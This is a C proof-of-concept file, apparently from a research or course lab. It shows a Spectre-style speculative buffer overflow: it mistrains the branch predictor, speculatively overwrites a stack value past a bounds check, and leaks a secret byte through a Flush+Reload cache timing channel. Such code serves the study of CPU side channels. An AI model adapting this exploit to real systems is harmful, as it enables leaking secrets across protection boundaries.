#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175


int  n_training   = 10;
int  secret_size  = 1;
char super_secret __attribute__ ((aligned (256))) = 97;

void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr) {
    int  buf_size __attribute__ ((aligned (256))) = 16;
    char user_char_copy __attribute__ ((aligned (256))) = user_char;


    printf("uid = %4d\tuc = %c\tpwd=%c\n", user_idx, user_char_copy, user_passwd);
    char secret = 'x';
    char buf[buf_size];// = malloc(buf_size * sizeof(char));    //ensure buf and secret are both on stack (adjacent)

    printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
           &secret, &buf, &buf[buf_size-1], &buf[user_idx]);

    __sync_synchronize();
    flush((void*)&buf_size);
    __sync_synchronize();
    //volatile char user_passwd_copy   = user_passwd;
    //volatile char secret_copy        = secret;
    //__sync_synchronize();

    if(user_char_copy=='s') {
        //als ik hier flush, wordt buf_size hierna wel gwn uit memory gefetch (ipv cache)
        int buf_size_time   = time_mem_load(&buf_size);
        int user_char_time  = time_mem_load(&user_char_copy);
        int user_idx_time   = time_mem_load(&user_idx);
        int buf_idx_time    = time_mem_load(&buf[user_idx]);
        int user_pwd_time   = time_mem_load(&user_passwd);
        int secret_time     = time_mem_load(&secret);
        int s_secret_time   = time_mem_load(&super_secret);
        int arr_time        = time_mem_load(&arr);
        int arr_access_t    = time_mem_load(&arr[super_secret]);

        printf("%p\tload buf_size       = %d\n", &buf_size, buf_size_time);
        printf("%p\tload user_char_copy = %d\n", &user_char_copy, user_char_time);
        printf("%p\tload user_idx       = %d\n", &user_idx, user_idx_time);
        printf("%p\tload buf[user_idx]  = %d\n", &buf[user_idx], buf_idx_time);
        printf("%p\tload user_passwd    = %d\n", &user_passwd, user_pwd_time);
        printf("%p\tload secret         = %d\n", &secret, secret_time);
        printf("%p\tload super secret   = %d\n", &super_secret, s_secret_time);
        //printf("%p\tload arr           = %d\n", &arr, arr_time);
        printf("%p\tload arr[super_s]   = %d\n", &arr[super_secret], arr_access_t);
    }//*/

    //bounds check should prevent overwrite. But speculatively executes
    if (user_idx < buf_size) {
        //if (user_char_copy == 's') printf("\noverwriting %p with 's'\n", &buf[user_idx]);
        buf[user_idx] = user_char_copy;
    }

    //printf("secret = %c\n", secret);

    //secret has been (speculatively) overwritten with user char.
    if (user_passwd == secret) {
        volatile cp_t cp = arr[super_secret];
        //printf("super secret: '%c' (%d)\n", cp.id, cp.id);
    }
}

int* overwrite(int index) {

    cp_t* arr = mmap_arr_cache_pages(N_PAGES);
    flush_arr((void*)arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = n_training + 1;
    int user_ids[n_accesses];
    char user_chars[n_accesses];
    char user_pwds[n_accesses];

    for(int i = 0; i < n_accesses; i++) {
        user_ids[i] = i % 16;//buf_size;
        user_chars[i] = 'a' + (i%26);
        user_pwds[i] = 'x';
    }
    user_ids[n_training] = 4094 - 256 + 16;
    user_chars[n_training] = 's';
    user_pwds[n_training] = 's';

    //Misstrain branch predictor, access out of bounds on last call
    for(int i = 0; i < n_accesses; i++) {
        check_passwd(user_ids[i], user_chars[i], user_pwds[i], arr);
        //ensures completion before flushing. bar prevents speculative access from being flushed
        __sync_synchronize();
        if(user_chars[i] != 's') flush((void*)&arr[super_secret]);
    }

    //make sure previous loop finishes execution
    __sync_synchronize();

    //time loading duration per array index
    int* results = reload(arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(arr, N_PAGES);
    return results;
}


int main(int argc, char** argv) {

    int*** results = alloc_results(REPETITIONS, secret_size, N_PAGES); //results[REPETITIONS][secret_size][N_PAGES]ints
    results[0][0] = overwrite(0);
    /*for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < secret_size; s++) {
            results[r][s] = overwrite(s);
            __sync_synchronize();
        }
    }*/
    print_results(results, REPETITIONS, secret_size, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, secret_size);
    //check_passwd(11, 's', 's');

    //reload();

    //print_results
}